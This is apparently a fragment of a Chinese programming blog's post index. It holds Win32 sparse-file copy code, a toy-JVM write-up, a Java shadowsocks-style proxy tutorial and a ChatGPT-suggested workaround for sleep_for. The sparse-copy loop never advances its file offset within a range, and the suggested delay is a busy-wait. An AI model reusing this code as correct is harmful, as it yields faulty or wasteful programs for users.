class=\"keyword\">sizeof</span></span>(FILE_ALLOCATED_RANGE_BUFFER);</span><br><span class=\"line\">        <span class=\"comment\">/* Print each allocated range */</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; dwAllocRangeCount; i++) &#123;</span><br><span class=\"line\">            ranges.<span class=\"built_in\">emplace_back</span>(allocRanges[i].FileOffset.QuadPart, allocRanges[i].Length.QuadPart);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">// Set starting address and size for the next query</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!fFinished &amp;&amp; dwAllocRangeCount &gt; <span class=\"number\">0</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            queryRange.FileOffset.QuadPart = </span><br><span class=\"line\">                allocRanges[dwAllocRangeCount - <span class=\"number\">1</span>].FileOffset.QuadPart +</span><br><span class=\"line\">                allocRanges[dwAllocRangeCount - <span class=\"number\">1</span>].Length.QuadPart;</span><br><span class=\"line\">            queryRange.Length.QuadPart = liFileSize.QuadPart - queryRange.FileOffset.QuadPart;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">while</span> (!fFinished);</span><br><span class=\"line\">    ::<span class=\"built_in\">CloseHandle</span>(hFile);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> std::<span class=\"built_in\">make_optional</span>(ranges);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"复制稀疏文件-1\"><a href=\"#复制稀疏文件-1\" class=\"headerlink\" title=\"复制稀疏文件\"></a>复制稀疏文件</h3><p>最后是Windows下稀疏文件的拷贝流程，基于之前提到的API，可以写出和Linux下稀疏文件类似的拷贝流程：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\"> * Represent the range using [&lt;offset, length&gt;] in bytes</span></span><br><span class=\"line\"><span class=\"comment\"> * Exmple from:</span></span><br><span class=\"line\"><span class=\"comment\"> * https://github.com/microsoft/cpprestsdk/blob/master/Release/tests/functional/streams/CppSparseFile.cpp</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">CopySparseFileWin32W</span><span class=\"params\">(<span class=\"keyword\">const</span> std::wstring&amp; wSrcPath, <span class=\"keyword\">const</span> std::wstring&amp; wDstPath,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    <span class=\"keyword\">const</span> std::vector&lt;std::pair&lt;<span class=\"keyword\">uint64_t</span>, <span class=\"keyword\">uint64_t</span>&gt;&gt;&amp; ranges)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> <span class=\"keyword\">int</span> DEFAULT_BUFF_SIZE = <span class=\"number\">1024</span>;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> buff[DEFAULT_BUFF_SIZE] = <span class=\"string\">&quot;\\0&quot;</span>;</span><br><span class=\"line\">    <span class=\"comment\">/* open file for read */</span></span><br><span class=\"line\">    HANDLE hInFile = ::<span class=\"built_in\">CreateFileW</span>(wSrcPath.<span class=\"built_in\">c_str</span>(),</span><br><span class=\"line\">        GENERIC_READ,</span><br><span class=\"line\">        FILE_SHARE_READ,</span><br><span class=\"line\">        <span class=\"literal\">nullptr</span>,</span><br><span class=\"line\">        OPEN_EXISTING,</span><br><span class=\"line\">        <span class=\"number\">0</span>,</span><br><span class=\"line\">        <span class=\"literal\">nullptr</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (hInFile == INVALID_HANDLE_VALUE) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">/* open file for write */</span></span><br><span class=\"line\">    HANDLE hOutFile = ::<span class=\"built_in\">CreateFileW</span>(wDstPath.<span class=\"built_in\">c_str</span>(),</span><br><span class=\"line\">        GENERIC_WRITE,</span><br><span class=\"line\">        FILE_SHARE_READ | FILE_SHARE_WRITE,</span><br><span class=\"line\">        <span class=\"literal\">nullptr</span>,</span><br><span class=\"line\">        CREATE_NEW,</span><br><span class=\"line\">        <span class=\"number\">0</span>,</span><br><span class=\"line\">        <span class=\"literal\">nullptr</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (hOutFile == INVALID_HANDLE_VALUE) &#123;</span><br><span class=\"line\">        ::<span class=\"built_in\">CloseHandle</span>(hInFile);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">/* set taget file sparse */</span></span><br><span class=\"line\">    DWORD dwTemp; <span class=\"comment\">/* store the setted attribute */</span></span><br><span class=\"line\">    ::<span class=\"built_in\">DeviceIoControl</span>(hOutFile,</span><br><span class=\"line\">        FSCTL_SET_SPARSE,</span><br><span class=\"line\">        <span class=\"literal\">nullptr</span>,</span><br><span class=\"line\">        <span class=\"number\">0</span>,</span><br><span class=\"line\">        <span class=\"literal\">nullptr</span>,</span><br><span class=\"line\">        <span class=\"number\">0</span>,</span><br><span class=\"line\">        &amp;dwTemp,</span><br><span class=\"line\">        <span class=\"literal\">nullptr</span>);</span><br><span class=\"line\">    <span class=\"comment\">/* truncate target file at first */</span></span><br><span class=\"line\">    LARGE_INTEGER sizeEx;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!::<span class=\"built_in\">GetFileSizeEx</span>(hInFile, &amp;sizeEx)) &#123;</span><br><span class=\"line\">        ::<span class=\"built_in\">CloseHandle</span>(hInFile);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    ::<span class=\"built_in\">SetFilePointerEx</span>(hOutFile, sizeEx, <span class=\"literal\">nullptr</span>, FILE_BEGIN);</span><br><span class=\"line\">    ::<span class=\"built_in\">SetEndOfFile</span>(hOutFile);</span><br><span class=\"line\">    <span class=\"comment\">/* write allocated range */</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">const</span> std::pair&lt;<span class=\"keyword\">uint64_t</span>, <span class=\"keyword\">uint64_t</span>&gt;&amp; range : ranges) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">uint64_t</span> offset = range.first;</span><br><span class=\"line\">        <span class=\"keyword\">uint64_t</span> len = range.second;</span><br><span class=\"line\">        sizeEx.QuadPart = offset;</span><br><span class=\"line\">        <span class=\"keyword\">do</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">int</span> nbytes = <span class=\"number\">0</span>; <span class=\"comment\">/* n bytes to copy in this batch */</span></span><br><span class=\"line\">            ::<span class=\"built_in\">SetFilePointerEx</span>(hInFile, sizeEx, <span class=\"literal\">nullptr</span>, FILE_BEGIN); <span class=\"comment\">/* set fd to the beginning of the range */</span></span><br><span class=\"line\">            ::<span class=\"built_in\">SetFilePointerEx</span>(hOutFile, sizeEx, <span class=\"literal\">nullptr</span>, FILE_BEGIN);</span><br><span class=\"line\">            nbytes = len &lt; <span class=\"built_in\"><span class=\"keyword\">sizeof</span></span>(buff) ? len: <span class=\"built_in\"><span class=\"keyword\">sizeof</span></span>(buff); <span class=\"comment\">/* if the range can be copied in this batch */</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!::<span class=\"built_in\">ReadFile</span>(hInFile, buff, nbytes, <span class=\"literal\">nullptr</span>, <span class=\"literal\">nullptr</span>)) &#123;</span><br><span class=\"line\">                <span class=\"comment\">/* read failed */</span></span><br><span class=\"line\">                ::<span class=\"built_in\">CloseHandle</span>(hInFile);</span><br><span class=\"line\">                ::<span class=\"built_in\">CloseHandle</span>(hOutFile);</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            DWORD nWritten = <span class=\"number\">0</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!::<span class=\"built_in\">WriteFile</span>(hOutFile, buff, nbytes, &amp;nWritten, <span class=\"literal\">nullptr</span>)) &#123;</span><br><span class=\"line\">                <span class=\"comment\">/* write failed */</span></span><br><span class=\"line\">                ::<span class=\"built_in\">CloseHandle</span>(hInFile);</span><br><span class=\"line\">                ::<span class=\"built_in\">CloseHandle</span>(hOutFile);</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            offset = offset + nbytes; <span class=\"comment\">/* reset offset and length */</span></span><br><span class=\"line\">            len = len - nbytes;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">while</span> (len != <span class=\"number\">0</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">/* copy success */</span></span><br><span class=\"line\">    ::<span class=\"built_in\">CloseHandle</span>(hInFile);</span><br><span class=\"line\">    ::<span class=\"built_in\">CloseHandle</span>(hOutFile);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>本文涉及的代码可以在<a href=\"https://github.com/XUranus/FileSystemUtil\">https://github.com/XUranus/FileSystemUtil</a>仓库中找到。该仓库提供<code>fsutil.exe -sparse &lt;filepath&gt;</code>来查询稀疏文件的分配区间：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:\\Users\\XUranus\\source\\repos\\FileSystemUtil\\build&gt;Debug\\fsutil.exe -sparse C:\\Test\\sparsefile</span><br><span class=\"line\">Logical Size: 104857600</span><br><span class=\"line\">Sparse Allocate Range:</span><br><span class=\"line\">offset = 20971520 , length = 10485760</span><br><span class=\"line\">offset = 52428800 , length = 31457280</span><br><span class=\"line\">Physic Allocate Size: 41943040</span><br><span class=\"line\">Hole Size: 62914560</span><br></pre></td></tr></table></figure>\n<h2 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h2><ul>\n<li><a href=\"https://www.bbsmax.com/A/ZOJPEV725v/\">Linux下稀疏文件的存储方式</a></li>\n<li><a href=\"https://mp.weixin.qq.com/s?__biz=MzAxNTcyNzAyOQ==&amp;mid=2650972387&amp;idx=2&amp;sn=9ee9e83571b0533de864e03796745b1e&amp;chksm=8009a039b77e292f535dd9d9b50db814fce78d13e306290638c7e7d93fd3dc8f0164ff55c398&amp;scene=27\">Linux 下 ls 和 du 计算的文件差别那么大？排查后结果竟是这样</a></li>\n<li><a href=\"https://www.cnblogs.com/cymm/archive/2013/04/04/3390397.html\">https://www.cnblogs.com/cymm/archive/2013/04/04/3390397.html</a></li>\n<li><a href=\"https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-setfilepointer\">SetFilePointer</a></li>\n<li><a href=\"https://learn.microsoft.com/en-us/windows/win32/fileio/sparse-file-operations\">Sparse File Operations</a></li>\n<li><a href=\"https://learn.microsoft.com/en-us/windows/win32/fileio/sparse-files\">Sparse File</a></li>\n</ul>\n","tags":["文件系统"]},{"title":"自己写个JVM","url":"/2019/03/02/%E8%87%AA%E5%B7%B1%E5%86%99%E4%B8%AAJVM/","content":"<p>寒假看《自己动手写JVM》和《java虚拟机精讲》写了一个半成品JVM，C++实现，项目地址：<a href=\"https://github.com/XUranus/JVM\">JVM</a>。</p>\n<p>首先是字节码解析，主要是常量池，字段的解析，除了几个涉及到Annotation属性外，基本都实现了解析，Attribute_Annotation_xxx涉及到的一些结构体嵌套太复杂了，暂时先没做（不影响运行）</p>\n<p>然后是运行时数据区（RDTA），主要涉及到线程，java虚拟机栈（Stack），方法帧（Frame），本地变量（Local Variables），操作数栈（Operand Stack）。都是简单的数据结构。<br>之后实现100多条基本字节码指令，const,load,store,math之类的。自此已经可以通过hack运行一些简单的单函数class文件。<br><span id=\"more\"></span></p>\n<p>直后开始写heap，存放class静态字段和方法的地方，把class文件的constantpool转化为堆区的constantpool，然后实现堆区的方法和字段信息，以及方法字段的符号引用。然后就可以开始写classloader了，注意数组和非数组类要分开实现，加载有几个阶段：先read，用composite模式实现zip，目录，同配符的entry，实现一个classpath读取器，根据classname获取对应path中类文件的字节数组；然后define，解析类文件，然后link，verify，prepare，迭代解析类的接口，超类，级联加载到heap。</p>\n<p>然后开始写方法的调用和参数传递返回，完善指令解释器，实现return系列的指令。此时可以初始化类了（调用<code>&lt;clinit&gt;</code>）方法，并可运行一些带有递归和调用的例子，如fibonacci，可以在repo的demo里面找到测试用例。</p>\n<p>最后时注册本地方法实现native method。例如<code>System.out.println()</code>。然而我的<code>java.lang.System</code>一直没法正常初始化。解析到native method就死循环，还没发现bug在哪。所以这里的<code>println</code>是hack出来的。以后有空补上GC，多线程和异常处理。项目本身只能运行不多的class文件，io网络GUI什么的统统没有，经典的成功的case都在demo里面给出了。</p>\n<p>大概1.5w行的样子，估计bug很多，内存泄露的问题很严重，（还是敲出来学习为主）。编译的class文件使用jdk11，repo中附带的<code>rt.jar</code>是8的，测试通过。</p>\n","tags":["Java"]},{"title":"自己写个shadowsocks","url":"/2018/11/27/%E8%87%AA%E5%B7%B1%E5%86%99%E4%B8%AAshadowsocks/","content":"<p>看到<a href=\"https://github.com/gwuhaolin/blog/issues/12\">你也能写个shadowsocks</a>这篇文章，对ss代理豁然开朗，忽然发现ss也不是一个特别高大上的项目，加上最近学习设计模式，不想写业务逻辑，就想用java实现个低配的shadowsocks。仓库：<a href=\"https://github.com/XUranus/lightsocks-java\">lightsocks-java</a></p>\n<h2 id=\"基本原理\"><a href=\"#基本原理\" class=\"headerlink\" title=\"基本原理\"></a>基本原理</h2><p>基本原理上面提到的那篇文章《<a href=\"https://github.com/gwuhaolin/blog/issues/12\">你也能写个shadowsocks</a>》已经讲了很清楚了，主要技术就是加密，解密，socks5代理<br><span id=\"more\"></span></p>\n<h2 id=\"加密\"><a href=\"#加密\" class=\"headerlink\" title=\"加密\"></a>加密</h2><p>为了“强行”体现设计模式（～逃），这里用了个Strategy模式，把加密模块抽象化，每个加密模块必须实现<code>encrypt()</code>和<code>decrypt()</code>方法，接口Cryptor中包含了一个静态的工厂方法，根据加密字符串选择实例化加密对象返回，于是这里又体现了Factory模式（笑）。实际证明后续配合上配置文件使用，这样写的确好了不少（～设计模式真是有用啊）<br><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">interface</span> <span class=\"title\">Cryptor</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">abstract</span> <span class=\"keyword\">byte</span>[] encrypt(<span class=\"keyword\">byte</span>[] data);</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">abstract</span> <span class=\"keyword\">byte</span>[] decrypt(<span class=\"keyword\">byte</span>[] data);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Cryptor <span class=\"title\">createNewCryptor</span><span class=\"params\">(String method,String key)</span> </span>&#123;</span><br><span class=\"line\">        method = method.toLowerCase();</span><br><span class=\"line\">        <span class=\"keyword\">switch</span> (method) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">case</span> <span class=\"string\">&quot;aes-256-cfb&quot;</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> AES_256_CFB(key);</span><br><span class=\"line\">            <span class=\"keyword\">case</span> <span class=\"string\">&quot;none&quot;</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> NoPasswordCryptor();</span><br><span class=\"line\">            <span class=\"keyword\">case</span> <span class=\"string\">&quot;simple&quot;</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> SimpleCrypto.getSimplieCrypto(key);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>当前实现的加密模式只有三个，严格说一个半。。。</p>\n<h3 id=\"AES\"><a href=\"#AES\" class=\"headerlink\" title=\"AES\"></a>AES</h3><p>首先第一个是<code>aes</code>分块加密算法，按理来说aes应该是唯一比较安全的。可能我对密码学毫不理解，对与aes加密只停留在调包套模板上，实际后来测试下一半情况下是能用的,各种长度不为16倍数的exception……还是等我学习了密码学后再来优化吧。</p>\n<h3 id=\"none\"><a href=\"#none\" class=\"headerlink\" title=\"none\"></a>none</h3><p>如果空白加密也算是一个加密方法的话，这个可以算上（～逃）</p>\n<h3 id=\"simple\"><a href=\"#simple\" class=\"headerlink\" title=\"simple\"></a>simple</h3><p>这是原作者文章中实现的一个简单的加密算法，大概就是说，用0-255的乱排序构造一个密钥，可以生成两个array，对每个byte（取值0-255）根据数组进行映射，解密加密前长度一样。起本质上就是一个置换密码，密钥的种类有255的乱排也就是254!个之多。但是实际上这种密码也可以根据统计规则被轻易破解的，相信进化到用机器学习识别流量特征的墙应该不会破不出来。所以这个也只能暂时做个简单加密。但是这种算法的确是最高效的，加密解密都是O(n)，前后长度不变化。尽管AES很强，但是我菜啊QAQ</p>\n<h2 id=\"转发\"><a href=\"#转发\" class=\"headerlink\" title=\"转发\"></a>转发</h2><p>客户端转发就是把一个socket的输出接到另一个的输入上，就是用<code>inputStream</code>和<code>outputStream</code>构造一个转发类，无脑的encryptForward或者decryptForward了。相比客户端，服务端无非就是处理socks5连接的建立，获取真实的remote的地址，然后继续无脑encryptForward或者decryptForward。当然为了减少多个应用同时请求带来的卡顿，开个多线程，举个Local线程中的例子：<br><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">new</span> EncryptForward(localIn,hostOut,Local.cryptor).start();</span><br><span class=\"line\"><span class=\"keyword\">new</span> DecryptForward(hostIn,localOut,Local.cryptor).start();</span><br></pre></td></tr></table></figure><br>再列举一下EncryptForward类的例子，举着一个即可，解密转发线程无非就是encrypt换成decrypt。网上很少有java写代理的，这里参考了<a href=\"https://github.com/chinashiyu\">chinashiyu</a>的<a href=\"https://github.com/chinashiyu/gfw.press\">gfw.press</a>中的一部分代码，自动调整缓冲区大小，可能是为了性能考虑（然而并没有看懂他的项目里服务器端处理socks5连接过程的代码）<br><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">EncryptForward</span> <span class=\"keyword\">extends</span> <span class=\"title\">Thread</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> InputStream in;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> OutputStream out;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">byte</span>[] buffer;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> Cryptor cryptor;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">boolean</span> isRunning;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"keyword\">int</span> BUFFER_SIZE_MIN = <span class=\"number\">1024</span> * <span class=\"number\">128</span>; <span class=\"comment\">// 缓冲区最小值，128K</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"keyword\">int</span> BUFFER_SIZE_MAX = <span class=\"number\">1024</span> * <span class=\"number\">512</span>; <span class=\"comment\">// 缓冲区最大值，512K</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"keyword\">int</span> BUFFER_SIZE_STEP = <span class=\"number\">1024</span> * <span class=\"number\">128</span>; <span class=\"comment\">// 缓冲区自动调整的步长值，128K</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">EncryptForward</span><span class=\"params\">(InputStream in, OutputStream out, Cryptor cryptor)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.buffer = <span class=\"keyword\">new</span> <span class=\"keyword\">byte</span>[BUFFER_SIZE_MIN];</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.in = in;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.out = out;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.isRunning = <span class=\"keyword\">true</span>;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.cryptor = cryptor;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">int</span> len = <span class=\"number\">0</span>;</span><br><span class=\"line\">            <span class=\"keyword\">while</span> ((len = in.read(buffer)) != -<span class=\"number\">1</span> &amp;&amp; isRunning) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">byte</span>[] rawData = Arrays.copyOfRange(buffer, <span class=\"number\">0</span>, len);</span><br><span class=\"line\">                <span class=\"keyword\">byte</span>[] encryptData = cryptor.encrypt(rawData);</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (encryptData == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">break</span>; <span class=\"comment\">// 加密出错，退出</span></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                out.write(encryptData);</span><br><span class=\"line\">                out.flush();</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (len == buffer.length &amp;&amp; len &lt; BUFFER_SIZE_MAX) &#123; <span class=\"comment\">// 自动调整缓冲区大小</span></span><br><span class=\"line\">                    buffer = <span class=\"keyword\">new</span> <span class=\"keyword\">byte</span>[len + BUFFER_SIZE_STEP];</span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (len &lt; (buffer.length - BUFFER_SIZE_STEP) &amp;&amp; (buffer.length - BUFFER_SIZE_STEP) &gt;= BUFFER_SIZE_MIN) &#123;</span><br><span class=\"line\">                    buffer = <span class=\"keyword\">new</span> <span class=\"keyword\">byte</span>[buffer.length - BUFFER_SIZE_STEP];</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (SocketException e) &#123;</span><br><span class=\"line\">            isRunning = <span class=\"keyword\">false</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"测试\"><a href=\"#测试\" class=\"headerlink\" title=\"测试\"></a>测试</h2><p>调试中的测试可以用python的黑科技：socks包，直接开一个本地代理socks，让自己写的lightsocks_local跑在8080端口，lightsocks_server泡在8090，以下代码会发出一次socks5连接代理请求。如果成功输出报文，可以在浏览器中开启代理进一步测试了<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> socks</span><br><span class=\"line\">s = socks.socksocket()</span><br><span class=\"line\">s.set_proxy(socks.SOCKS5, <span class=\"string\">&quot;localhost&quot;</span>, <span class=\"number\">8080</span>)</span><br><span class=\"line\">s.connect((<span class=\"string\">&quot;baidu.com&quot;</span>, <span class=\"number\">80</span>))</span><br><span class=\"line\">s.sendall(<span class=\"built_in\">str</span>(<span class=\"string\">&quot;GET / HTTP/1.1\\n&quot;</span>).encode())</span><br><span class=\"line\"><span class=\"built_in\">print</span> (s.recv(<span class=\"number\">4096</span>))</span><br></pre></td></tr></table></figure><br>把server跑在vps上，开启代理，google打开，就说明成功了。</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>这种写出来的ss也只是学会了网络代理的一点皮毛，真实的ss比这个就加密算法而言不知道高到哪里去了，还有ssr的混淆黑科技。<strong>本项目仅作技术讨论学习，请勿用于非法用途！</strong></p>\n","tags":["科学上网"]},{"title":"解决C++中sleep对系统时间的依赖","url":"/2023/04/03/%E8%A7%A3%E5%86%B3C-%E4%B8%ADsleep%E5%AF%B9%E7%B3%BB%E7%BB%9F%E6%97%B6%E9%97%B4%E7%9A%84%E4%BE%9D%E8%B5%96/","content":"<p>最近遇到一个业务上修改Windows系统时间导致程序“卡住”的问题，经定位是<code>std::this_thread::sleep_for</code>函数阻塞线程时间长于预期。例如将系统时间往后调一小时，原本阻塞一秒的<code>std::this_thread::sleep_for</code>居然阻塞了一小时之久。查阅相关资料发现是<code>std::this_thread::sleep_for</code>的实现依赖于系统时间，如果系统时间修改则其行为不符合预期。</p>\n<p>问了ChatGPT解决方案，它的回答是：</p>\n<blockquote>\n<p>在C++中，sleep函数是用于暂停程序执行指定时间的。当系统时间被修改时，和sleep相关的函数例如<code>std::this_thread::sleep_for</code>和<code>std::this_thread::sleep_util</code>可能会表现出异常行为，因为它通常依赖于系统时钟。为了规避这个问题，你可以使用<code>std::chrono</code>库中的高精度时钟（<code>std::chrono::steady_clock</code>）来实现延时操作，因为它不受系统时间修改的影响。</p>\n<p>以下是使用<code>std::this_thread::sleep_for</code>和<code>std::chrono::steady_clock</code>实现稳定延时的示例代码：</p>\n</blockquote>\n<span id=\"more\"></span>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;thread&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;chrono&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">delay</span><span class=\"params\">(std::chrono::milliseconds duration)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">auto</span> start = std::chrono::steady_clock::<span class=\"built_in\">now</span>();</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (std::chrono::steady_clock::<span class=\"built_in\">now</span>() - start &lt; duration) &#123;</span><br><span class=\"line\">        std::this_thread::<span class=\"built_in\">yield</span>();  <span class=\"comment\">// 让出CPU时间片，降低资源占用</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    std::cout &lt;&lt; <span class=\"string\">&quot;程序开始执行&quot;</span> &lt;&lt; std::endl;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">auto</span> delay_duration = std::chrono::<span class=\"built_in\">milliseconds</span>(<span class=\"number\">5000</span>);  <span class=\"comment\">// 设定延时时间，例如5000毫秒</span></span><br><span class=\"line\">    <span class=\"built_in\">delay</span>(delay_duration);</span><br><span class=\"line\"></span><br><span class=\"line\">    std::cout &lt;&lt; <span class=\"string\">&quot;延时结束，程序继续执行&quot;</span> &lt;&lt; std::endl;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>此代码片段中的delay函数使用<code>std::chrono::steady_clock</code>来确保延时不受系统时间修改的影响。这种方法降低了程序对系统时间变化的敏感性，使得程序更稳定。</p>\n<p><code>std::chrono::steady_clock</code>和<code>std::chrono::system_clock</code>是C++标准库中的组件，它们的详细信息可以在C++标准库的官方参考文档中找到：</p>\n<ol>\n<li><p><code>std::chrono::steady_clock</code>：<a href=\"https://en.cppreference.com/w/cpp/chrono/steady_clock\">https://en.cppreference.com/w/cpp/chrono/steady_clock</a></p>\n</li>\n<li><p><code>std::chrono::system_clock</code>：<a 